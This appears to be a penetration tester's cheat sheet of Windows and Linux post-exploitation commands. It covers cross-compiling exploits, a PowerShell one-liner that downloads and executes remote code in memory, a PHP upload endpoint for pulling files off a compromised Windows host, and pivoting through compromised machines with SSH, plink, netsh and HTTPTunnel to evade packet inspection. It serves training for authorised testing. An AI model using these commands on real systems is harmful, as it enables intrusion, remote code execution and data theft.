# Miscelaneous

#### :red_circle: Usefull Regex

##### Find subdomains in a text file (html usually):

```bash

grep -o '[^/]*\.$DOMAIN\.com' $FILE
#-o  returns the string defined in our regular expression
```
##### Create symbolik link:

```bash
ln -s $TARGET $LINKNAME
```

_____
## Compiling exploits

There are times that we are on Linux and some exploits needs to compile from a Windows machine (requieres dependencies). In this case, we can use a cross-compiler to help in the way:

```bash
#Install:
apt install mingw-w64

#Usage:
i686-w64-mingw32-gcc $EXPLOITFILENAME.c -o $OUTPUTNAME.exe
#In case of error, try adding the flag: -lws2_32
```

**Note:** It's always better to do it on it's own platform.

_____

## Package Python applications

Python code requieres an interpreter in order to execute it's instructions. This means we need python to be installed in a machine that we want to run a python script.

We can use **PyInstaller** which packages python applications into standalone executables for various OS.

_____

## Downloading files from Windows

#### Using Powershell one-liner:

```bash
powershell.exe (New-Object System.Net.WebClient).DownloadFile('$URLOFFILE', '$NEWFILENAME')
```

If we want to download and execute the same file but not saving it to the disk, use:

```bash
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('$URLOFFILE')
```

#### Using exe2hex & powershell

First of all, optimize the file we want to transfer by using upx:

```bash
upx -9 $FILE
```

Now use exe2hex to convert the file:

```bash
exe2hex -x $FILE -p $RESULTFILENAME.cmd
#This creates a script with .cmd extension
```

Now we only need to copy and paste the script into a Windows shell.

_____

## Windows Uploads

If we want to transfer files, in this case from Windows to linux, we can use some of the following techniques:

#### Hosting an uploads.php file

**Step 1:** Create the following php file on Kali:

```bash
<?php
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>
```

**Step 2:** Create the 'uploads' directory and set owner permissions to www-data:

```bash
mkdir /var/www/html/uploads && chown www-data: /var/www/html/uploads
```

**Step 3:** Restart Apache2 service:

```bash
sudo systemctl restart apache2
```

**Step 4:** Upload the file executing the following command in a Windows cmd:

```bash
powershell (New-Object System.Net.WebClient).UploadFile('http://$IPADDRESS/uploads/uploads.php', '$FILETOUPLOAD')
```

_____

## Compiling exploits in windows

If a Windows client have Mingw-w64 pre-installed we can compile C/C++ codes. First, go to the mingw-w64/i686.../ directory and execute the ".bat" file that set up the PATH variable for the gcc executable.

Once done, we can use as in Linux to compile our exploits:

```bash
gcc $EXPLOITFILENAME -o $FINALNAME.exe
```

_____

## Reverse shells one-liner

[Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

_____

## Port Forwarding

RINETD is a tool that helps us to achieve port forwarding. Once this tool is installed we need to add the forwarding rules on the next file:

```bash
#file: /etc/rinetd.conf
#Add the following line under forwarding rules:
0.0.0.0 $PORT $IPADDRESS $PORT

#For example, forward any incoming web access to the 1.2.3.4 server:
0.0.0.0 80 1.2.3.4 80

#Once done, restart the service and watch if it's active:
sudo service rinetd restart
ss -antp | gre "$PORT"
```

_____

## SSH Port Forwarding

Imagine we discovered an internet network on a compromised machine. We can use SSH tunneling to stablish connection from our Kali to this machine (using the compromised machine as a tunnel):

```bash
ssh -N -L 0.0.0.0:$PORT:$IPADDRESS:$PORT $USER@$IPADDRESS2
#-N: No command prompt
#-L: Local port forward
#$PORT: Port to forward
#$IPADDRESS: IP address of the internal network machine
#$USER: User on the compromised machine to log in as SSH
#$IPADDRESS2: IP address of the compromised machine
```
____
## SSH Remote Port Forwarding

Same as SSH Port forwarding but in this case executed inside the compromised machine, to bind a port from this machine to our Kali machine:

```bash
ssh -N -R $IPKALI:$PORT:127.O.O.1:$PORT kali@$IPKALI
```

Then we can interact with the remote port from our attacker machine:

```bash
nmap -sS -p$PORT 127.0.0.1
```

____

## SSH Dynamic port Forwarding

The following method will be used to get connectivity to all the ports from our Kali machine to the Internal machine, using the compromised linux client as intermediary.

First of all we need to configure proxychains:

```bash
nano /etc/proxychains.conf
#add the following line imder [ProxyList]
socks4 127.0.0.1 8080
```

Now create the Dynamic port forwarding:

```bash
ssh -N -D 127.0.0.1:8080 $COMPROMISEDUSER@$COMPROMISEDIPADDRESS
```

Note: In order to effectively use this method we need to start the applications through proxychains. For example:

```bash
proxychains nmap -sS -p- $INTERNALNETWORKIP
```

_____

## SSH Dynamic for Windows - PLINK

We can use the above techniques in Windows  thanks to the PLINK.exe tool:

```bash
#-R: Reverse, but we can use -L for local and -D for dynamic:
cmd.exe /c echo y | plink.exe -ssh -l $USERNAME -pw $PASSWORD -R $KALIIP:$PORT:127.0.0.1:$PORT $KALIIP
```

_____

## Windows port Forwarding - NETSH

Imagine we have compromised a Windows client and it's connected to an internal network which we do not have access from our Kali machine. We can pivot to any internal machine thanks to netsh:

Note: Execute all the commands on the compromised machine.

First of all we need to add the following firewall rule to enable inbound traffic from the desired port:

```bash
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=$COMPROMISEDIPADDRESS localport=$LOCALPORTTOUSE action=allow
#LOCALPORTTOUSE: If we want 445, use 4455. If we want 3306, use 33306...
```

Now execute the following netsh command:

```bash
netsh interface portproxy add v4tov4 listenport=$LOCALPORTTOUSE listenaddress=$COMPROMISEDIPADDRESS connectport=$INTERNALPORT connectaddress=$INTERNALIPADDRESS
```

Now we can interact with the internal machine port using the IP address and port of the compromised machine.

_____

## Tunneling using HTTP protocol - HTTPTunnel

We will rely on HTTPTunnel to encapsulate our traffic within HTTP requests, creating an “HTTP tunnel”.

**Scenario:** Compromised Linux machine that have access to an internal network which is not accessible from our Kali machine. Also, only http traffic is allowed.

```bash
#Local port forward to the internal network:
ssh -L 0.0.0.0:8888:$IPINTERNALNETWORK:$PORTINTERNALNETWORK $USER@127.0.0.1

#Use HTTPServer to redirect incoming traffic from 1234 to 8888 port:
hts --forward-port localhost:8888 1234
```

In our Kali machine:

```bash
htc --forward-port 8080 $COMPROMISEDIPADDRESS:$PORT
```

Now everything will be encapsulated as HTTP protocol to evade Deep Packet Inspection.

_____

## Transfering executables through FTP

```bash
#Use "binary" mode:
ftp> binary
200 Type set to I.
```
